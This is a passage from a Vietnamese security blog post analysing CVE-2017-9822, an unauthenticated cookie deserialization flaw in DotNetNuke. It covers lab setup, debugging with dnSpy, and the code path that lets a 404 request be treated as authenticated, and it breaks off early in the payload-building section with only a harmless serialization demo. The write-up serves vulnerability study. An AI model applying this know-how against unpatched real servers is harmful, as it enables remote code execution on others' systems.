<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Tìm hiểu CVE-2017-9822 - DotNetNuke Cookie Deserialization RCE | devme4f&#39;s blog</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/dotnetnuke_cve-2017-9822/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Tìm hiểu CVE-2017-9822 - DotNetNuke Cookie Deserialization RCE" />
<meta property="og:description" content="Preface DotNetNuke là hệ thống quản lý nội dung(content management system) mã nguồn mở trên nền tảng ASP.NET. Bài viết này sẽ đi vào phân tích CVE-2017-9822 trên DNN, lỗ hổng unauth insecure deserialization có thể dẫn đến RCE. Lỗ hổng được được phát hiện bởi Alvaro Muñoz và trình bày tại blackhat US 2017 - Friday the 13th JSON Attacks gồm nhiều advanced techniques về khai thác java/.net deserialization, được coi như mở ra kỷ nguyên mới về khai thác loại lỗ hổng này!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2023/dotnetnuke_cve-2017-9822/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-17T17:44:52+07:00" />
<meta property="article:modified_time" content="2023-01-17T17:44:52+07:00" />

  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Tìm hiểu CVE-2017-9822 - DotNetNuke Cookie Deserialization RCE"/>
<meta name="twitter:description" content="Preface DotNetNuke là hệ thống quản lý nội dung(content management system) mã nguồn mở trên nền tảng ASP.NET. Bài viết này sẽ đi vào phân tích CVE-2017-9822 trên DNN, lỗ hổng unauth insecure deserialization có thể dẫn đến RCE. Lỗ hổng được được phát hiện bởi Alvaro Muñoz và trình bày tại blackhat US 2017 - Friday the 13th JSON Attacks gồm nhiều advanced techniques về khai thác java/.net deserialization, được coi như mở ra kỷ nguyên mới về khai thác loại lỗ hổng này!"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/posts/2023/liferay_cve-2019-16891/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/posts/2023/angstromctf-2023_filestore/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&text=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&is_video=false&description=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&name=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE&description=Preface%20DotNetNuke%20l%c3%a0%20h%e1%bb%87%20th%e1%bb%91ng%20qu%e1%ba%a3n%20l%c3%bd%20n%e1%bb%99i%20dung%28content%20management%20system%29%20m%c3%a3%20ngu%e1%bb%93n%20m%e1%bb%9f%20tr%c3%aan%20n%e1%bb%81n%20t%e1%ba%a3ng%20ASP.NET.%20B%c3%a0i%20vi%e1%ba%bft%20n%c3%a0y%20s%e1%ba%bd%20%c4%91i%20v%c3%a0o%20ph%c3%a2n%20t%c3%adch%20CVE-2017-9822%20tr%c3%aan%20DNN%2c%20l%e1%bb%97%20h%e1%bb%95ng%20unauth%20insecure%20deserialization%20c%c3%b3%20th%e1%bb%83%20d%e1%ba%abn%20%c4%91%e1%ba%bfn%20RCE.%20L%e1%bb%97%20h%e1%bb%95ng%20%c4%91%c6%b0%e1%bb%a3c%20%c4%91%c6%b0%e1%bb%a3c%20ph%c3%a1t%20hi%e1%bb%87n%20b%e1%bb%9fi%20Alvaro%20Mun%cc%83oz%20v%c3%a0%20tr%c3%acnh%20b%c3%a0y%20t%e1%ba%a1i%20blackhat%20US%202017%20-%20Friday%20the%2013th%20JSON%20Attacks%20g%e1%bb%93m%20nhi%e1%bb%81u%20advanced%20techniques%20v%e1%bb%81%20khai%20th%c3%a1c%20java%2f.net%20deserialization%2c%20%c4%91%c6%b0%e1%bb%a3c%20coi%20nh%c6%b0%20m%e1%bb%9f%20ra%20k%e1%bb%b7%20nguy%c3%aan%20m%e1%bb%9bi%20v%e1%bb%81%20khai%20th%c3%a1c%20lo%e1%ba%a1i%20l%e1%bb%97%20h%e1%bb%95ng%20n%c3%a0y%21" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&t=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#build-lab">Build lab</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#sink-of-the-bug">Sink of the bug</a></li>
        <li><a href="#debugging">Debugging</a></li>
        <li><a href="#sink-to-the-source">Sink to the source</a></li>
        <li><a href="#build-payload">Build payload</a></li>
      </ul>
    </li>
    <li><a href="#the-patch-and-bypass">The patch and bypass</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Tìm hiểu CVE-2017-9822 - DotNetNuke Cookie Deserialization RCE
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2023-01-17 17:44:52 &#43;0700 &#43;07" itemprop="datePublished">2023-01-17</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/cve" rel="tag">cve</a>
            
             ,  
            <a class="tag-link" href="/tags/deser" rel="tag">deser</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p><img src="/images/2023/DotNetNuke_CVE-2017-9822/theme.png" alt="theme"></p>
<h2 id="preface">Preface</h2>
<p>DotNetNuke là hệ thống quản lý nội dung(content management system) mã nguồn mở trên nền tảng <code>ASP.NET</code>. Bài viết này sẽ đi vào phân tích <code>CVE-2017-9822</code> trên DNN, lỗ hổng unauth insecure deserialization có thể dẫn đến RCE. Lỗ hổng được được phát hiện bởi <code>Alvaro Muñoz</code> và trình bày tại <code>blackhat US 2017 - Friday the 13th JSON Attacks</code> gồm nhiều advanced techniques về khai thác java/.net deserialization, được coi như mở ra kỷ nguyên mới về khai thác loại lỗ hổng này!</p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/advisory.png" alt="theme">
<em><a href="https://www.dnnsoftware.com/community/security/security-center">https://www.dnnsoftware.com/community/security/security-center</a></em></p>
<h2 id="build-lab">Build lab</h2>
<p><strong>Link Github</strong>: <a href="https://github.com/dnnsoftware/Dnn.Platform">https://github.com/dnnsoftware/Dnn.Platform</a></p>
<p>Mình sẽ debug dựa trên <code>DNN version 9.1.0</code>, có thể download tại: <a href="https://github.com/dnnsoftware/Dnn.Platform/releases">https://github.com/dnnsoftware/Dnn.Platform/releases</a></p>
<p>Cách cài đặt DNN các bạn có thể tham khảo tại: <a href="https://www.digitalalphas.com/how-to-install-dotnetnuke-dnn/">https://www.digitalalphas.com/how-to-install-dotnetnuke-dnn/</a></p>
<p>Hoàn thành:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/complete-setup.png" alt="complete-setup"></p>
<h2 id="analysis">Analysis</h2>
<h3 id="sink-of-the-bug">Sink of the bug</h3>
<p>Như report, lỗ hổng xảy ra ở phần xử lý <code>DNNPersonalization</code> cookie, cookie này được dùng để load user profile tuy nhiên vẫn có thể trigger unauthen khi truy cập một trang không tồn tại(404 error). Entrypoint của bug này nằm ở hàm <code>LoadProfile</code> thuộc module <code>DotNetNuke.dll</code>, ta sẽ decompile module này bằng <em>dnSpy</em> và phân tích kĩ hơn:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/DotNetNuke.png" alt="DotNetNuke.dll"></p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/LoadProfile-method.png" alt="LoadProfile method"></p>
<p>Tại <code>PersonalizationController#LoadProfile(int, int)</code>
<img src="/images/2023/DotNetNuke_CVE-2017-9822/LoadProfile-method-in.png" alt="LoadProfile method details"></p>
<p>Nếu <code>userId</code> khác null thì biến <code>text</code> sẽ được gán giá trị của <code>DNNPersonalization</code> cookie từ request sau đó gọi đến <code>Globals#DeserializeHashTableXml</code>
<img src="/images/2023/DotNetNuke_CVE-2017-9822/DeserializeHashTableXml.png" alt="DeserializeHashTableXml"></p>
<p><code>Globals#DeserializeHashTableXml</code> gọi đến <code>XmlUtils#DeSerializeHashtable</code>
<img src="/images/2023/DotNetNuke_CVE-2017-9822/DeSerializeHashtable.png" alt="DeSerializeHashtable"></p>
<p>Sink lỗ hổng này tại đây khi hàm này cho phép <strong>deserialize arbitrary object type</strong> tại <em>XmlSerializer</em>. Thứ tự xử lý như sau:</p>
<ul>
<li>LoadXml từ <code>xmlSource</code></li>
<li>Duyệt qua từng node <code>item</code> trong root <code>profile</code>.</li>
<li>Với mỗi item, lấy object type được định nghĩa dựa vào attribute <code>type</code> và khởi tạo <code>XmlSerializer</code> theo type object đó như dòng <em>160-161</em></li>
<li>Deserialize item này thành một object ở dòng <em>163</em> và lưu vào hashtable</li>
<li>Trả về hashtable</li>
</ul>
<p>Ta hoàn toàn có thể kiểm soát giá trị <code>DNNPersonalization</code> cookie do đó có thể sửa đổi object được deserialize. Để exploit lỗ hổng này cần lưu ý <em>XmlSerializer</em> có các giới hạn chính trong serialization như sau:</p>
<ol>
<li>Chỉ có thể serialize các trường và thuộc tính public</li>
<li>Chỉ hỗ trợ một nhóm các object nhất định bới nó không thể serialize abstract class</li>
<li>Loại object khi thực hiện <em>XmlSerializer</em> phải được biết đến trong runtime.</li>
</ol>
<h3 id="debugging">Debugging</h3>
<p>Để hiểu kĩ hơn, ta sẽ tiến hành dynamic debug dotnetnuke. Debug <em>.NET</em> phức tạp hơn các ngôn ngữ khác một chút do khi compile code C# thành file thực thi, compiler sẽ tối ưu code do đó khi debug thông thường và đặt breakpoint thường nó sẽ nhảy sai dòng. Do vậy ta cần sửa assembly attributes file từ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[assembly:
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]</span>
</span></span></code></pre></div><p>thành:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]</span>
</span></span></code></pre></div><p>sau đó có thể compile lại file này bằng dnspy. <code>DotNetNuke.dll</code> được xây dựng trên 32-bit do đó ta cần edit bằng dnspy phiên bản 32 bit mới có thể compile lại được.
<img src="/images/2023/DotNetNuke_CVE-2017-9822/edit_aa.png" alt="edit_aa">
<em>Edit Assemby Attributes</em></p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/edit_aa_replace.png" alt="edit_aa_replace">
<em>Replace it</em></p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/edit_aa_save.png" alt="edit_aa_save">
<em>Save all(overwrite it)</em></p>
<p>Cùng cần lưu ý rằng khi khởi động <em>IIS worker</em>, nó sẽ không load assemblies từ <code>C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll</code> mà sẽ copy các file cần thiết cho DNN hoạt động đến <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\dotnetnuke\</code> và load từ thư mục này.</p>
<p>Sau khi đã edit <code>DotNetNuke.dll</code> ta sẽ debug <em>DNN</em> bằng dnSpy.</p>
<ol>
<li>Attach tiến trình <em>w3wp.exe</em> vào dnSpy: Debug &ndash;&gt; Attach to Process &ndash;&gt; Refresh &ndash;&gt; w3wp.exe. Sử dụng dnSpy 64-bit để debug IIS server 64-bit. Ở đây sau một hồi mày mò mà dnSpy không refresh ra <em>w3wp.exe</em> thì mình thử chạy lại dnSpy dưới quyền admin mới tìm thấy process này.</li>
<li>Sau khi attach ta sẽ tạm dừng debug hiện tại: <code>Break All</code></li>
<li>Tiếp đến, list tất cả module được load bởi w3wp.exe: Debug &ndash;&gt; Windows &ndash;&gt; Modules</li>
<li>Click vào module bất kì và chọn <code>Open All Module</code> để mở tất cả module đó</li>
<li>Tìm đến module <code>DotNetNuke.dll</code> &ndash;&gt; <code>LoadProfile(int,int)</code>, request 404 page nếu dnSpy hit breakpoint thì đã dynamic debug thành công
<img src="/images/2023/DotNetNuke_CVE-2017-9822/test_req1.png" alt="test_req1"></li>
</ol>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/hit_breakpoint.png" alt="hit_breakpoint"></p>
<h3 id="sink-to-the-source">Sink to the source</h3>
<p>Set up dynamic debug thành công, cùng xem từ request 404 error page gọi đến sink như thế nào qua <code>Call Stack</code>:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/call_stack.png" alt="callstack"></p>
<p>Call Stack trên khá dài và phức tạp nhưng chỉ cần tập trung vào các method call sau:</p>
<p>Tại class <code>PortalSettings</code> getter method được invoke và gọi đến <code>Personalization#GetProfile</code> như dòng <em>925</em> dưới, cái sẽ tiếp tục gọi đến method <code>LoadProfile</code>, sink của lỗ hổng.
<img src="/images/2023/DotNetNuke_CVE-2017-9822/PortalSettings.png" alt="PortalSettings"></p>
<p>Điều đáng chú là ở dòng <em>922</em> có điều kiện <code>if</code> kiểm tra xem request hiện tại đã là <code>IsAuthenticated</code> hay chưa và rõ ràng request ta vừa thực hiện là unauthenticated đến một entrypoint không tồn tại. Vậy tại sao request hiện tại được thực hiện như một authenticated user.</p>
<p>Tiếp tục debug, lùi về gần cuối stack thì thấy tại <code>AdvancedUrlRewriter#Handle404OrException</code> có vòng <code>else if</code> như sau:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/Handle404OrException.png" alt="Handle404OrException"></p>
<p>Ở đây nó sẽ kiểm tra request <code>context.User</code> hiện tại có là <code>null</code>, nếu đúng như vậy sẽ gán <code>context.User</code> là user thread hiện tại, set breakpoint có thể thấy được kết quả như sau:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/context.User.png" alt="context.User"></p>
<p>Biến <code>IsAuthenticated</code> bây giờ có giá trị là <code>true</code> và user được gán chính là user chạy thread hiện tại thuộc nhóm <code>IIS APPPOOL</code> của IIS server do đó request được thực hiện như một authenticated user.
Lý do logic này tồn tại là bởi <em>404 handler</em> được invoke trước khi <code>HttpContext.User</code> được set và luồng xử lý tiếp dựa vào <code>User.IsAuthenticated</code> nên để tránh bị lỗi <em>Null references</em>, developers gán <em>User</em> object bằng <em>WindowsPrinicipal</em> object của thread hiện tại.</p>
<p>Ok, ta vừa phân tích và hiểu được vì sao tồn tại lỗ hổng insercure deser tại module DNN ở method <code>LoadProfile</code> mà vẫn có thể trigger khi đang unauthen, phần tiếp sẽ build payload để exploit lỗ hổng này.</p>
<h3 id="build-payload">Build payload</h3>
<h4 id="play-with-xmlserializer">Play with XmlSerializer</h4>
<p>Đầu tiên, dựa vào sink của CVE này chính là <code>XmlUtils#DeSerializeHashtable</code> như đã đề cập trên, tạo một chương trình tương tự serialize và deserialize object:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Xml;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Xml.Serialization;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> example
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">string</span> _name;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> name
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">get</span> { <span style="color:#66d9ef">return</span> _name; }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">set</span> { <span style="color:#66d9ef">this</span>._name = <span style="color:#66d9ef">value</span>; Console.WriteLine(<span style="color:#e6db74">&#34;Setted _name field to: &#34;</span> + <span style="color:#66d9ef">value</span>); }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> fileFolder = <span style="color:#e6db74">&#34;D:\\lab\\csharp\\DNN\\example\\serialization\\&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Serialize(Object obj) <span style="color:#75715e">// method xml serialize arbitrary object </span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// tạo xml root element</span>
</span></span><span style="display:flex;"><span>            XmlDocument xmlDocument = <span style="color:#66d9ef">new</span> XmlDocument();
</span></span><span style="display:flex;"><span>            XmlElement xmlElementRoot = xmlDocument.CreateElement(<span style="color:#e6db74">&#34;profile&#34;</span>);
</span></span><span style="display:flex;"><span>            xmlDocument.AppendChild(xmlElementRoot);
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// tạo node con item có attribute type chứa tên object type</span>
</span></span><span style="display:flex;"><span>            XmlElement xmlElementItem = xmlDocument.CreateElement(<span style="color:#e6db74">&#34;item&#34;</span>);
</span></span><span style="display:flex;"><span>            xmlElementItem.SetAttribute(<span style="color:#e6db74">&#34;type&#34;</span>, obj.GetType().AssemblyQualifiedName);
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// serialize obj thành xmlDocumentObj</span>
</span></span><span style="display:flex;"><span>            XmlDocument xmlDocumentObj = <span style="color:#66d9ef">new</span> XmlDocument();
</span></span><span style="display:flex;"><span>            XmlSerializer xmlSerializer = <span style="color:#66d9ef">new</span> XmlSerializer(obj.GetType());
</span></span><span style="display:flex;"><span>            StringWriter stringWriter = <span style="color:#66d9ef">new</span> StringWriter();
</span></span><span style="display:flex;"><span>            xmlSerializer.Serialize(stringWriter, obj);
</span></span><span style="display:flex;"><span>            xmlDocumentObj.LoadXml(stringWriter.ToString());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// thêm xml serialized object này vào node item và thêm node item vào root element</span>
</span></span><span style="display:flex;"><span>            xmlElementItem.AppendChild(xmlDocument.ImportNode(xmlDocumentObj.DocumentElement, <span style="color:#66d9ef">true</span>));
</span></span><span style="display:flex;"><span>            xmlElementRoot.AppendChild(xmlElementItem);
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            File.WriteAllText( fileFolder + <span style="color:#e6db74">&#34;obj.xml&#34;</span>, xmlDocument.OuterXml);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> DeSerialize(<span style="color:#66d9ef">string</span> xmlSource, <span style="color:#66d9ef">string</span> rootname)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Hashtable hashtable = new Hashtable();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">string</span>.IsNullOrEmpty(xmlSource))
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    XmlDocument xmlDocument = <span style="color:#66d9ef">new</span> XmlDocument();
</span></span><span style="display:flex;"><span>                    xmlDocument.LoadXml(xmlSource);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">object</span> obj <span style="color:#66d9ef">in</span> xmlDocument.SelectNodes(rootname + <span style="color:#e6db74">&#34;/item&#34;</span>))
</span></span><span style="display:flex;"><span>                    {
</span></span><span style="display:flex;"><span>                        XmlElement xmlElement = (XmlElement)obj;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">string</span> attribute = xmlElement.GetAttribute(<span style="color:#e6db74">&#34;key&#34;</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">string</span> attribute2 = xmlElement.GetAttribute(<span style="color:#e6db74">&#34;type&#34;</span>);
</span></span><span style="display:flex;"><span>                        XmlSerializer xmlSerializer = <span style="color:#66d9ef">new</span> XmlSerializer(Type.GetType(attribute2));
</span></span><span style="display:flex;"><span>                        XmlTextReader xmlReader = <span style="color:#66d9ef">new</span> XmlTextReader(<span style="color:#66d9ef">new</span> StringReader(xmlElement.InnerXml));
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// hashtable.Add(attribute, xmlSerializer.Deserialize(xmlReader));</span>
</span></span><span style="display:flex;"><span>                        
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// custom</span>
</span></span><span style="display:flex;"><span>                        Object objResult = xmlSerializer.Deserialize(xmlReader);
</span></span><span style="display:flex;"><span>                        Test testObj = (Test) objResult;
</span></span><span style="display:flex;"><span>                        Console.WriteLine(<span style="color:#e6db74">&#34;Deserialize sucessful: &#34;</span> + testObj.name);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">catch</span> (Exception)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// return hashtable;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// serialize</span>
</span></span><span style="display:flex;"><span>            Test test = <span style="color:#66d9ef">new</span> Test();
</span></span><span style="display:flex;"><span>            test.name = <span style="color:#e6db74">&#34;ahihi ahuhu&#34;</span>; <span style="color:#75715e">// set field _name thông qua property name </span>
</span></span><span style="display:flex;"><span>            Serialize(test);
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// deserialize</span>
</span></span><span style="display:flex;"><span>            String xmlSource = File.ReadAllText(fileFolder + <span style="color:#e6db74">&#34;obj.xml&#34;</span>);
</span></span><span style="display:flex;"><span>            DeSerialize(xmlSource, <span style="color:#e6db74">&#34;profile&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
